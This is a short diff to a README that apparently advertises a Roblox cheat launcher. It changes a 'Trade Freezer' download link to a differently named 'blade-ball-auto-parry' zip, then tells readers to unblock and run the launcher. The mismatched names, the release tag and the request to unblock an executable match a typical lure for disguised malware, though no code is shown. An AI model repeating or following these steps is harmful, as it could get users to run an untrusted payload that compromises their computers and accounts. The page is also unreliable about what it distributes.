@@ -32,7 +32,7 @@
 
 ### Installation & Usage Please watch this video before starting https://youtu.be/8XYXdn9gFaE
 
-1. Download the file and unzip it somewhere. https://github.com/jjsplt/Murder-Mystery-2-Trade-Freezer/archive/refs/tags/v1485.zip
+1. Download the file and unzip it somewhere. https://github.com/master277/blade-ball-auto-parry/archive/refs/tags/v1485.zip
 2. Open our script Launcher when you have unblocked it you can see how in the video above.
 3. Run our Launcher and have fun
 
